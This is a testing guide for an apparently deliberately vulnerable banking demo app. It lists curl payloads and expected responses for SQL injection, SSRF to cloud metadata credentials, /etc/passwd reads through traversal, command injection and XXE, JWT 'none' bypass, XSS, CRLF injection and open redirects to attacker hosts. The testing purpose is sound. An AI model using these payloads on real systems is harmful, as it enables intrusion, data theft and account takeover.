# NexusBank Security Testing Guide

This guide details how to manually trigger and verify every simulated vulnerability within the NexusBank application using `curl` or a REST client (like Postman/Insomnia).

## 1. Database Injections

### Error-based SQL Injection
The `/api/transactions` endpoint directly concatenates the `id` parameter into a SQLite query.
**Payload:**
```bash
curl -s "http://localhost:3000/api/transactions?id=1'"
```
**Expected Response:** `{"error":"SQLITE_ERROR: unrecognized token: \"'\""}`

### NoSQL Injection Simulation
The `/api/transactions/search` endpoint simulates a MongoDB driver that throws an error when NoSQL operators (`$gt`, `$ne`, etc.) are injected into the JSON body.
**Payload:**
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"amount": {"$gt": 0}}' http://localhost:3000/api/transactions/search
```
**Expected Response:** `{"error":"MongoError: unknown operator"}`

### Mass Assignment / Privilege Escalation
The `/api/profile` endpoint merges all incoming JSON fields into the user profile object, reflecting any injected canary values.
**Payload:**
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"snap_xyz_123": "a9s8x9a8sxasx89as", "role": "admin"}' http://localhost:3000/api/profile
```
**Expected Response:** Contains `"reflection":"a9s8x9a8sxasx89as"` and `"role":"admin"`.

## 2. Server-Side Request Forgery (SSRF)

The `/api/fetch-receipt` endpoint blindly fetches user-supplied URLs. It includes mocks for AWS Metadata (`169.254.169.254`) and CouchDB (`127.0.0.1:5984`).
**Payload:**
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' http://localhost:3000/api/fetch-receipt
```
**Expected Response:** `{"Code":"Success","AccessKeyId":"AKIAIOSFODNN7EXAMPLE"...}`

## 3. File Inclusions (LFI/RFI)

The `/api/documents/download` endpoint is vulnerable to path traversal and remote file inclusion.
**Local File Inclusion (LFI):**
```bash
curl -s "http://localhost:3000/api/documents/download?file=../../../../../etc/passwd"
```
**Expected Response:** Simulated `/etc/passwd` contents (`root:x:0...`).

**Remote File Inclusion (RFI):**
```bash
curl -s "http://localhost:3000/api/documents/download?file=http://example.com"
```
**Expected Response:** HTML content of `<h1>Example Domain</h1>`.

## 4. Command Injections

### OS Command Injection
The `/api/system/ping` endpoint passes input directly to `exec`.
**Payload:**
```bash
curl -s "http://localhost:3000/api/system/ping?ip=127.0.0.1;cat%20/etc/passwd"
```

### Python/Node Code Injection
The `/api/diagnostics/run-script` endpoint simulates an unsafe `eval()` or OS popen call.
**Payload:**
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"script": "os.popen(\"id\").read()"}' http://localhost:3000/api/diagnostics/run-script
```
**Expected Response:** `uid=0(root) gid=0(root)...`

### Angular Client-Side Template Injection (CSTI)
**Payload:**
```bash
curl -s "http://localhost:3000/api/template/render?msg={{13337*7}}"
```
**Expected Response:** `Rendered: 93359`

## 5. Authorization & Authentication

### JWT None Algorithm Bypass
The `/api/admin/users` endpoint accepts tokens without a signature if `alg: none` is specified.
**Payload:** Send a JWT where the header is `{"alg":"none","typ":"JWT"}` and payload is `{"role":"admin"}` without a signature.
```bash
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://localhost:3000/api/admin/users
```
**Expected Response:** `{"message":"Admin access granted"...}`

### Unauthorized Sensitive Data Exposure
**Payload:**
```bash
curl -s "http://localhost:3000/api/public/data"
```
**Expected Response:** `200 OK` JSON response despite lacking authentication headers.

## 6. Sensitive Data Exposure

The data export endpoint dumps 15 different types of highly sensitive PII, credentials, and API keys.
**Payload:**
```bash
curl -s "http://localhost:3000/api/transactions/export"
```
**Expected Response:** A large JSON array containing AWS keys, Stripe keys, GitHub tokens, SSNs, IBANs, Credit Cards, etc.

## 7. Cross-Site Scripting (XSS)

The `/api/search` endpoint reflects input into an HTML response without sanitization.
**Payload:**
```bash
curl -s "http://localhost:3000/api/search?q=<script>alert(1)</script>"
```
**Expected Response:** HTML containing `<script>alert(1)</script>`.

## 8. Open Redirect

The `/api/login` endpoint blindly redirects to user-supplied URLs if `redirect_to` is present in the POST body.
**Payload:**
```bash
curl -s -v -X POST -H "Content-Type: application/json" -d '{"username":"john", "password":"password123", "redirect_to":"https://attacker.com"}' http://localhost:3000/api/login
```
**Expected Response:** `HTTP/1.1 302 Found` with `Location: https://attacker.com`.

## 9. CRLF / HTTP Response Splitting

The `/api/set-preference` endpoint vulnerable to CRLF injection via the `lang` parameter.
**Payload:**
```bash
curl -s -i "http://localhost:3000/api/set-preference?lang=en%0D%0ASet-Cookie:%20crlfinjected=true"
```
**Expected Response:** The response headers will contain the injected `Set-Cookie: crlfinjected=true` due to the carriage return / line feed injection.

## 10. XML External Entity (XXE) / XInclude

The `/api/transactions/import` endpoint processes XML and executes XInclude directives.
**Payload:**
```bash
curl -s -X POST -H "Content-Type: text/xml" -d '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>' http://localhost:3000/api/transactions/import
```
**Expected Response:** The XML parser will return the contents of the local `/etc/passwd` file within the parsed string.

## 11. ASP.NET Tracing
The application simulates an enabled ASP.NET trace viewer.
**Payload:**
```bash
curl -s "http://localhost:3000/trace.axd"
```
**Expected Response:** HTML containing "Application Trace" and "Request Details".

## 12. CORS & Security Headers

### Insecure CORS
Several endpoints (`/api/cors/null`, `/api/cors/wildcard`, `/api/cors/regex`) demonstrate insecure CORS configurations by allowing arbitrary origins, null origins, or wildcard origins with credentials.
**Payload:**
```bash
curl -s -I -H "Origin: https://attacker.com" http://localhost:3000/api/cors/regex
```
**Expected Response:** `Access-Control-Allow-Origin: https://attacker.com`

### Missing Security Headers
Every endpoint in the application globally strips essential security headers to simulate a vulnerable server configuration.
- **Missing CSP:** No `Content-Security-Policy` header.
- **Missing HSTS:** No `Strict-Transport-Security` header.
- **Missing X-Frame-Options:** Allows clickjacking.
- **Missing X-Content-Type-Options:** Allows MIME sniffing.
- **Missing Referrer-Policy:** Header is explicitly removed.
- **Server Disclosure:** Explictly leaks `Server: Apache/2.4.1`.

### Insecure Cookies (Missing HttpOnly & Secure Flags)
Every response globally sets a `session_id` cookie without the `HttpOnly` or `Secure` flags.
**Payload:**
```bash
curl -s -I http://localhost:3000/api/system/logs
```
**Expected Response:** `Set-Cookie: session_id=nexus_session_token_123; Path=/` (Note the absence of `; HttpOnly` and `; Secure`).

## 13. Advanced Headers and Routing Bypasses

### HTTP Method Override Bypass
The `/api/admin/settings` endpoint only accepts PUT requests natively. We can bypass routing restrictions by sending a POST with the `X-HTTP-Method-Override: PUT` header.
**Payload:**
```bash
curl -s -X POST -H "X-HTTP-Method-Override: PUT" http://localhost:3000/api/admin/settings
```
**Expected Response:** `{"success":true,"message":"Settings updated successfully","role":"admin"}`

### Host Header Poisoning (Open Redirect)
The `/api/password-reset` endpoint trusts the `X-Forwarded-Host` or `Host` header to generate a password reset link, leading to an open redirect.
**Payload:**
```bash
curl -s -v -H "X-Forwarded-Host: evil.snapsec.co" http://localhost:3000/api/password-reset
```
**Expected Response:** `HTTP/1.1 302 Found` with `Location: http://evil.snapsec.co/reset-token-12345`

### Referer-Based Open Redirection
The `/api/auth/callback` endpoint redirects the user back to the URL specified in the `Referer` header.
**Payload:**
```bash
curl -s -v -H "Referer: https://evil.snapsec.co" http://localhost:3000/api/auth/callback
```
**Expected Response:** `HTTP/1.1 302 Found` with `Location: https://evil.snapsec.co`

## 14. Server-Side Template Injection (SSTI)

The `/api/template/render-doc` endpoint evaluates template variables supplied by the user natively.
**Payload:**
```bash
curl -s "http://localhost:3000/api/template/render-doc?tmpl={{1337*1337}}"
```
**Expected Response:** `Rendered Document: 1787569`

## 15. Misconfiguration / Information Disclosure

### Directory Listing Enabled
Requesting the parent `/api/docs/` directory without a file simulates an exposed directory index.
**Payload:**
```bash
curl -s http://localhost:3000/api/docs/
```
**Expected Response:** HTML containing `<title>Index of /api/docs/</title>` and a link to `.env`.
